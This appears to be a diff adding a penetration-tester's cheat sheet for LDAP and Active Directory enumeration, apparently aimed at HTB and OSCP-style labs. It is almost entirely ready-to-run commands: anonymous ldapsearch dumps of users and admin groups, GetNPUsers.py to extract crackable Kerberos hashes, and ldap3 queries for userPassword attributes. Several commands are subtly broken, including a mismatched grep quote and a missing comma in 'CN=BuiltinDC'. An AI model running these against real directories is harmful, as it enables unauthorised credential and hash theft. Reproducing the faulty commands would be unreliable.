@@ -1,0 +1,66 @@
+LDAP - 389, 636, 3268
+
+ldapsearch
+$ ldapsearch -LLL -x -H ldap://<ip> -b '' -s base '(objectclass=*)' | grep naming                    
+$ ldapsearch -x -H ldap://<ip> -b '<dc-found>' # See more info about Domain Controller  
+
+After you find potential users and DC try:
+GetNPUsers.py : To extract TGT hashes
+$ GetNPUsers.py <dc-found>/ -usersfile <userfile> -format john -outputfile hashes.txt -dc-ip <ip>
+
+      
+- ldapdomaindump (requires user creds)
+    - NOTE: this may fail (get a UnicodeDecodeError) htb, PG, and oscp machines if the scheme is changed
+        > ldapdomaindump 10.10.10.161 -u 'domain\username' -p 'password' -o /output/file/path --authtype SIMPLE
+        > ldapdomaindump ldap://10.10.10.161
+        
+- ldapsearch (null creds), if output "bind must be completed" or "operations error", you need creds. 
+    - ldapsearch -h 10.10.10.100 389 -x -s base -b '' "(objectClass=*)" "*" +
+
+    - NOTE: "-D" is the username --> 'domain\username'
+            "-w" is hte passwrod --> 'password'
+            
+    - Dump hole database (WARNING: very large! output to file)
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" > ldap-dump.txt
+        
+    - Check for access to user passwords
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'userpas"
+        
+    - Dump users
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Users,DC=htb,DC=local" > ldap-dump-users.txt
+        
+    - Dump computer
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Computers,DC=htb,DC=local" > ldap-dump-computers.txt
+    - Dump Domain Admins
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Domain Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-domainAdmins.txt
+        
+    - Dump Enterprise Admins
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Enterprise Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-enterpriseAdmins.txt
+        
+    - Dump Administrators
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Administrators,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-Administrators.txt
+        
+    - Dump Remote Desktop Group
+        > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Remote Desktop Users,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-RemoteDesktopUsers.txt
+        
+- ldapgatherer
+    > ldapgather -u '' -p '' -s 10.10.10.161 -d htb.local
+- ldapgatherer.py
+    > ./ldapgatherer.py
+- 
+- python ldap3
+    > python3
+    >>> import ldap3
+    >>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =389, use_ssl = False)
+    >>> connection = ldap3.Connection(server)
+    >>> connection.bind()
+    True
+    - Gather all info
+    >>> server.info
+    >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
+    True
+    >> connection.entries
+    - Dump all of ldap
+    >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
+    True
+    >>> connection.entries
